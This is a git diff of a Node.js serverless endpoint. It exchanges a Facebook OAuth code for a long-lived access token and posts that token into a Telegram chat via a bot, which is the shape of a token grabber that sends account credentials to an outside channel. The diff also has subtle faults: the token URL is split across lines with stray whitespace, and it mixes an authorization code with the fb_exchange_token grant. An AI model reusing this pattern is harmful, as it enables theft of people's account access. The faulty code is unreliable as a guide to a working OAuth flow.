@@ -10,22 +10,32 @@ module.exports = async (req, res) => {
     return res.status(405).send('Method Not Allowed');
   }
 
-  const { access_token } = req.query;
+  const { code } = req.query;
 
-  if (!access_token) {
-    return res.status(400).send('Missing access_token');
+
+  const tokenUrl = `https://graph.facebook.com/v23.0/oauth/access_token?
+    client_id=${process.env.APP_ID}
+    &client_secret=${process.env.APP_SECRET}
+    &code=${code}
+    &grant_type=fb_exchange_token`;
+
+  if (!code) {
+    return res.status(400).send('Missing code');
   }
 
   try {
+    const response = await fetch(tokenUrl);
+    const data = await response.json();
+    const llt = data.access_token;
     await bot.telegram.sendMessage(
       CHAT_ID,
-      `🔑 Facebook токен:\n\n\`${access_token}\``,
+      `🔑 Facebook токен:\n\n\`${llt}\``,
       { parse_mode: 'Markdown' }
     );
 
-    res.status(200).send(`Token отправлен в Telegram!\nToken: ${access_token}`);
+    res.status(200).send(`OK`);
   } catch (error) {
-    console.error('token:', process.env.BOT_TOKEN, 'Ошибка:', error);
+    console.error('Ошибка:', error);
     res.status(500).send('Ошибка при отправке токена');
   }
 };
